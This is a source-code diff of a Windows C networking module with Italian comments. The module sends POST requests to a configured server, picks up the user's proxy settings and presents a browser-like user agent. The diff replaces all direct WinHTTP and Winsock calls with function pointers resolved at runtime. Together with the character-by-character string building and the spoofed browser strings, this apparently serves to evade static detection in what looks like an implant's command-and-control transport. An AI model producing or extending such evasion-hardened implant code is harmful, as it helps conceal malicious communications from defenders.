@@ -2,6 +2,7 @@
 #include <Winhttp.h>
 #include <stdio.h>
 #include "win_http.h"
+#include "api.h"
 
 #undef _GLOBAL_VERSION_FUNCTIONS_
 #include "version.h"
@@ -9,12 +10,14 @@
 HINTERNET hGlobalInternet = 0;
 HINTERNET hSession = 0;
 HINTERNET hConnect = 0;
+extern PDYNAMIC_WINHTTP dynamicWinHttp;
+extern PDYNAMIC_WINSOCK dynamicWinsock;
 
 PBYTE WinHTTPGetResponse(PULONG uOut)
 {
 	PBYTE pHttpResponseBuffer;
 
-	if (!WinHttpReceiveResponse(hGlobalInternet, NULL))
+	if (!dynamicWinHttp->fpWinhttpreceiveresponse(hGlobalInternet, NULL))
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] WinHttpReceiveResponse FAIL\n");
@@ -26,7 +29,7 @@ PBYTE WinHTTPGetResponse(PULONG uOut)
 	WCHAR szContentLength[32];
 	ULONG uBufLen = sizeof(szContentLength);
 	ULONG uIndex = WINHTTP_NO_HEADER_INDEX;
-	if (!WinHttpQueryHeaders(hGlobalInternet, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, &szContentLength, &uBufLen, &uIndex))
+	if (!dynamicWinHttp->fpWinhttpqueryheaders(hGlobalInternet, WINHTTP_QUERY_CONTENT_LENGTH, WINHTTP_HEADER_NAME_BY_INDEX, &szContentLength, &uBufLen, &uIndex))
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] WinHttpQueryHeaders FAIL\n");
@@ -48,7 +51,7 @@ PBYTE WinHTTPGetResponse(PULONG uOut)
 	uRead = *uOut = 0;
 	do
 	{
-		if (!WinHttpReadData(hGlobalInternet, pHttpResponseBuffer + *uOut, uContentLength, &uRead))
+		if (!dynamicWinHttp->fpWinhttpreaddata(hGlobalInternet, pHttpResponseBuffer + *uOut, uContentLength, &uRead))
 		{
 			//fixed (non veniva deallocato il buffer in caso di errore)
 			free(pHttpResponseBuffer);
@@ -79,7 +82,7 @@ BOOL WinHTTPSendData(PBYTE pBuffer, ULONG uBuffLen)
 	WCHAR strContentLength[] = { L'C', L'o', L'n', L't', L'e', L'n', L't', L'-', L'L', L'e', L'n', L'g', L't', L'h', L':', L' ', L'%', L'd', L'\0' };
 	WCHAR pContentLength[1024];
 	swprintf_s(pContentLength, 1024, strContentLength, uBuffLen);
-	ret = WinHttpSendRequest(hGlobalInternet, 
+	ret = dynamicWinHttp->fpWinHttpSendRequest(hGlobalInternet, 
 		pContentLength,
 		-1L, 
 		pBuffer, 
@@ -118,14 +121,33 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	ZeroMemory(&pProxyInfo, sizeof(pProxyInfo));
 	ZeroMemory(&pProxyConfig, sizeof(pProxyConfig));
 
+
+	///* init dynamic winhttp */
+	if(dynamicWinHttp == NULL)
+	{
+		if((dynamicWinHttp = (PDYNAMIC_WINHTTP) malloc(sizeof(DYNAMIC_WINHTTP))) != NULL)
+		{
+			if( !API_LoadWinHttp(&dynamicWinHttp))
+				return FALSE;
+		}
+		else
+			return FALSE;
+	}
+
+	///* init dynamic winsock */
+	//dynamicWinsock = (PDYNAMIC_WINSOCK) malloc(sizeof(DYNAMIC_WINSOCK));
+	//if (dynamicWinsock)
+	//	if(!loadWinsock(&dynamicWinsock))
+	//		return FALSE;
+
 	// Crea una sessione per winhttp.
 	//hSession = WinHttpOpen(L"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 	//hSession = WinHttpOpen(L"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 	//hSession = WinHttpOpen(L"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
-	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
+	hSession = dynamicWinHttp->fpWinhttpopen(USER_AGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 
 	// Cerca nel registry le configurazioni del proxy
-	if (hSession && WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig)) 
+	if (hSession && dynamicWinHttp->fpWinhttpgetieproxyconfigforcurrentuser(&pProxyConfig)) 
 	{
 		if (pProxyConfig.lpszProxy) 
 		{
@@ -145,7 +167,7 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 			pOptPAC.lpvReserved = 0;
 			pOptPAC.dwReserved = 0;
 
-			if (WinHttpGetProxyForUrl(hSession ,_wHostProto, &pOptPAC, &pProxyInfoTemp))
+			if (dynamicWinHttp->fpWinhttpgetproxyforurl(hSession ,_wHostProto, &pOptPAC, &pProxyInfoTemp))
 				memcpy(&pProxyInfo, &pProxyInfoTemp, sizeof(pProxyInfo));
 		}
 
@@ -159,7 +181,7 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 			pOptPAC.lpvReserved = 0;
 			pOptPAC.dwReserved = 0;
 
-			if (WinHttpGetProxyForUrl(hSession ,_wHostProto, &pOptPAC, &pProxyInfoTemp))
+			if (dynamicWinHttp->fpWinhttpgetproxyforurl(hSession ,_wHostProto, &pOptPAC, &pProxyInfoTemp))
 				memcpy(&pProxyInfo, &pProxyInfoTemp, sizeof(pProxyInfo));
 		}
 
@@ -167,7 +189,7 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 		if (pProxyInfo.lpszProxy) 
 		{
 			isProxy = TRUE;
-			WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &pProxyInfo, sizeof(pProxyInfo));
+			dynamicWinHttp->fpWinhttpsetoption(hSession, WINHTTP_OPTION_PROXY, &pProxyInfo, sizeof(pProxyInfo));
 
 			// Parsa la stringa per separare la porta
 			_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%S", pProxyInfo.lpszProxy);
@@ -182,7 +204,7 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 
 			if (!ResolveName(pAddrToConnect, pAddrToConnect, uBufLen))
 			{
-				WinHttpCloseHandle(hSession);
+				dynamicWinHttp->fpWinhttpclosehandle(hSession);
 #ifdef _DEBUG
 				OutputDebugString(L"[!!] Cannot resolve name 1\n");
 #endif
@@ -211,16 +233,16 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	free(pDebugString);
 #endif
 	// Definisce il target
-	if (!(hConnect = WinHttpConnect(hSession, (LPCWSTR)_wHost, INTERNET_DEFAULT_HTTP_PORT, 0)))
+	if (!(hConnect = dynamicWinHttp->fpWinhttpconnect(hSession, (LPCWSTR)_wHost, INTERNET_DEFAULT_HTTP_PORT, 0)))
 		return FALSE;
 
-	if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", POST_PAGE, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
+	if (!(hGlobalInternet = dynamicWinHttp->fpWinhttpopenrequest(hConnect, L"POST", POST_PAGE, NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
 	  
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] WinHttpOpenRequest FAILED\n");
 #endif
-		WinHttpCloseHandle(hSession);
+		dynamicWinHttp->fpWinhttpclosehandle(hSession);
 		return FALSE;
 	}
 
@@ -228,7 +250,7 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 		OutputDebugString(L"[!!] WinHttpOpenRequest SUCCEEDED\n");
 #endif
 
-	if(!WinHttpSetTimeouts(hGlobalInternet, RESOLVE_TIMEOUT, CONNECT_TIMEOUT, SEND_TIMEOUT, RECV_TIMEOUT) == TRUE)
+	if(!dynamicWinHttp->fpWinhttpsettimeouts(hGlobalInternet, RESOLVE_TIMEOUT, CONNECT_TIMEOUT, SEND_TIMEOUT, RECV_TIMEOUT) == TRUE)
 	{
 		#ifdef _DEBUG
 			OutputDebugString(L"[!!] WinHttpSetTimeouts FAILED\n");
@@ -260,14 +282,14 @@ BOOL ResolveName(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen)
 #endif
 
 	// E' gia' un indirizzo IP
-	if (inet_addr((PCHAR)pServerUrl) != INADDR_NONE) 
+	if (dynamicWinsock->fpinet_addr((PCHAR)pServerUrl) != INADDR_NONE) 
 	{
 		_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%s", pServerUrl);
 		return TRUE;
 	}
 
 	wVersionRequested = MAKEWORD(2, 2);
-	if (WSAStartup(wVersionRequested, &pWSAData )!= 0)
+	if (dynamicWinsock->fpWSAStartup(wVersionRequested, &pWSAData )!= 0)
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"WSAStartup FAILED\n");
@@ -275,10 +297,10 @@ BOOL ResolveName(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen)
 		return FALSE;
 	}
 
-	hAddress = gethostbyname((PCHAR)pServerUrl);
-	WSACleanup();
+	hAddress = dynamicWinsock->fpgethostbyname((PCHAR)pServerUrl);
+	dynamicWinsock->fpWSACleanup();
 
-	if (!hAddress || !(pAddrPtr = (PBYTE)inet_ntoa(*(struct in_addr*)hAddress->h_addr)))
+	if (!hAddress || !(pAddrPtr = (PBYTE)dynamicWinsock->fpinet_ntoa(*(struct in_addr*)hAddress->h_addr)))
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"inet_ntoa or gethostbyname FAILED\n");
@@ -294,12 +316,13 @@ BOOL ResolveName(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen)
 
 VOID WinHTTPClose()
 {
+
 	if (hSession)
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"[+] Closing hSession\n");
 #endif
-		WinHttpCloseHandle(hSession);
+		dynamicWinHttp->fpWinhttpclosehandle(hSession);
 	}
 	hSession = NULL;
 
@@ -308,7 +331,7 @@ VOID WinHTTPClose()
 #ifdef _DEBUG
 		OutputDebugString(L"[+] Closing hGlobalInternet\n");
 #endif
-		WinHttpCloseHandle(hGlobalInternet);
+		dynamicWinHttp->fpWinhttpclosehandle(hGlobalInternet);
 	}
 	hGlobalInternet = NULL;
 
@@ -317,7 +340,7 @@ VOID WinHTTPClose()
 #ifdef _DEBUG
 		OutputDebugString(L"[+] Closing hConnect\n");
 #endif
-		WinHttpCloseHandle(hConnect);
+		dynamicWinHttp->fpWinhttpclosehandle(hConnect);
 	}
 	hConnect = NULL;
 
